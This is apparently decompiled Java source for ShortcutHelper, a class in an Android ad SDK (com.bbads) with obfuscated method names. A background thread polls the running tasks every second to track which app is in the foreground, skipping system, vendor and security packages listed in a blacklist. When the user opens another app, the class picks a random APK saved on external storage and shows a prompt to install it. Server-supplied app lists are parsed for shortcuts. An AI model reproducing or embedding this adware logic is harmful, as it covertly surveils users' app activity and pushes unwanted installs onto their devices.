package com.bbads.android.shortcut;
import java.io.File;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Map;
import java.util.Random;
import org.json.JSONArray;
import org.json.JSONObject;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningTaskInfo;
import android.content.ComponentName;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.Environment;
import android.os.Handler;
import android.os.Message;
import com.bbads.android.CS;
import com.bbads.android.Constants;

public class ShortcutHelper {
    public static void a(ArrayList<ShortcutApp> list) {
        Message message = Message.obtain();
        message.what = 1;
        message.obj = list;
        HANDLER.sendMessage(message);
    }
    static void c() {
        e();
    }
    private static void c(String s) {
        ArrayList arraylist = new ArrayList();
        JSONArray jsonarray;
        int i;
        ShortcutApp class1009;
        JSONObject jsonobject;
        Message message;
        try {
            jsonarray = new JSONArray(s);
            i = 0;
            while (i < jsonarray.length()) {
                class1009 = new ShortcutApp();
                jsonobject = jsonarray.getJSONObject(i);
                class1009.setId(jsonobject.getString("id"));
                class1009.setName(jsonobject.getString("name"));
                class1009.setIcon(jsonobject.getString("icon").replace("\\", ""));
                class1009.setIntro(jsonobject.getString("intro"));
                class1009.setPackageName(jsonobject.getString("package"));
                class1009.setBigPic(jsonobject.getString("bigpic").replace("\\", ""));
                class1009.setAppUrl(jsonobject.getString("appurl").replace("\\", ""));
                class1009.seteLock(jsonobject.getString("islock"));
                arraylist.add(class1009);
                i++;
            }
            message = Message.obtain();
            message.what = 1;
            message.obj = arraylist;
            HANDLER.sendMessage(message);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return;
    }
    public static void checkTask(Context context, String s) {
        CONTEXT = context;
        PREF_KEY = s;
        saveDataToPref();
        initHandler();
        d();
        SharedPreferences sharedpreferences = context.getSharedPreferences(CS.PREF_KEY, 0);
        if (ShortcutManager.isTime(CS.PREF_KEY, context) || sharedpreferences.getString(CS.AP_PATH_TAG, "").equals("")) ShortcutManager.c(context, s);
        else c(sharedpreferences.getString(CS.AP_PATH_TAG, ""));
        ShortcutManager.request(CONTEXT);
    }
    private static void d() {
        new Thread() {
            @Override
            public void run() {
                int i = 0;
                while (true) {
                    ActivityManager manager = (ActivityManager) CONTEXT.getSystemService("activity");
                    List<RunningTaskInfo> list = manager.getRunningTasks(1000);
                    ComponentName componentname = manager.getRunningTasks(1).get(0).topActivity;
                    if (list.size() <= i || ShortcutHelper.isBlackPackage(componentname.getPackageName())) {
                        i = list.size();
                    } else {
                        i = list.size();
                        SharedPreferences sharedpreferences = CONTEXT.getSharedPreferences(CS.PREF_KEY, 0);
                        long l = sharedpreferences.getLong(CS.CHECK_PRE_TIME_TAG, 0L);
                        long l1 = System.currentTimeMillis();
                        if (Math.abs(l1 - l) / 1000L > 5L) {
                            android.content.SharedPreferences.Editor editor = sharedpreferences.edit();
                            editor.putLong(CS.CHECK_PRE_TIME_TAG, l1);
                            editor.commit();
                            try {
                                Thread.sleep(2000L);
                            } catch (InterruptedException e) {
                                // TODO Auto-generated catch block
                                e.printStackTrace();
                            }
                            ShortcutHelper.c();
                        }
                        i = list.size();
                    }
                    try {
                        Thread.sleep(1000L);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        }.start();
    }
    private static void e() {
        CONTEXT.getSharedPreferences(CS.PREF_KEY, 0).getString("appid", "");
        SharedPreferences sharedpreferences = CONTEXT.getSharedPreferences(CS.PREF_KEY2, 0);
        sharedpreferences.edit();
        Map<String, ?> map = sharedpreferences.getAll();
        if (map.size() > 0) {
            int random = new Random().nextInt(5);
            int j = 0;
            for (String packagename : map.keySet()) {
                String as[] = ((String) map.get(packagename)).split(",");
                if (j < random) {
                    j++;
                } else {
                    String appName = as[2];
                    String url = as[3];
                    String fileName = url.substring(1 + url.lastIndexOf("/"), url.length());
                    String absolutePath = new File(Environment.getExternalStorageDirectory(), fileName).getAbsolutePath();
                    sendMessage(absolutePath + "," + packagename + "," + appName);
                    return;
                }
            }
        }
    }
    public static void initHandler() {
        HANDLER = new Handler() {
            @Override
            public void handleMessage(Message message) {
                switch (message.what) {
                    case 1:
                        ArrayList<ShortcutApp> list = (ArrayList<ShortcutApp>) message.obj;
                        ShortcutManager.a(CONTEXT, list);
                        return;
                    case 2:
                        String as[] = ((String) message.obj).split(",");
                        String filePath = as[0];
                        String packageName = as[1];
                        String appName = as[2];
                        InstallDialog dialog = new InstallDialog(CONTEXT);
                        dialog.check(CONTEXT, new File(filePath), packageName, appName);
                        return;
                }
            }
        };
    }
    protected static boolean isBlackPackage(String s) {
        ArrayList<String> blackList = new ArrayList<String>();
        blackList.add("com.android.");
        blackList.add("com.example.servicedemo");
        blackList.add("com.sec.");
        blackList.add("com.wandoujia.");
        blackList.add("com.samsung.");
        blackList.add("com.htc.launcher");
        blackList.add("com.android.packageinstaller");
        blackList.add("com.qihoo360.");
        blackList.add("com.legame.sybbvideo1");
        try {
            blackList.add(CONTEXT.getPackageManager().getPackageInfo(CONTEXT.getPackageName(), 0).packageName);
        } catch (Exception e) {
            e.printStackTrace();
        }
        for (String packageName : blackList) {
            if (s.contains(packageName) || s.equals("android")) { return true; }
        }
        return false;
    }
    private static void saveDataToPref() {
        SharedPreferences sharedpreferences = CONTEXT.getSharedPreferences("plginitsp", 0);
        android.content.SharedPreferences.Editor editor = sharedpreferences.edit();
        if (sharedpreferences.getBoolean("isFirst", true)) {
            editor.putLong("preTime", System.currentTimeMillis());
            editor.putBoolean("isFirst", false);
            editor.putInt("times", 0);
            editor.remove(PREF_KEY);
            editor.putString("appid", PREF_KEY);
            editor.putInt(CS.INSTALL_MONTH_TAG, 1 + new Date().getMonth());
            editor.putInt(CS.INSTALL_DAY_TAG, new Date().getDate());
            editor.commit();
        }
    }
    public static void sendMessage(String s) {
        Message message = Message.obtain();
        message.what = 2;
        message.obj = s;
        HANDLER.sendMessage(message);
    }
    private static Context CONTEXT;
    private static Handler HANDLER;
    private static String PREF_KEY;
}
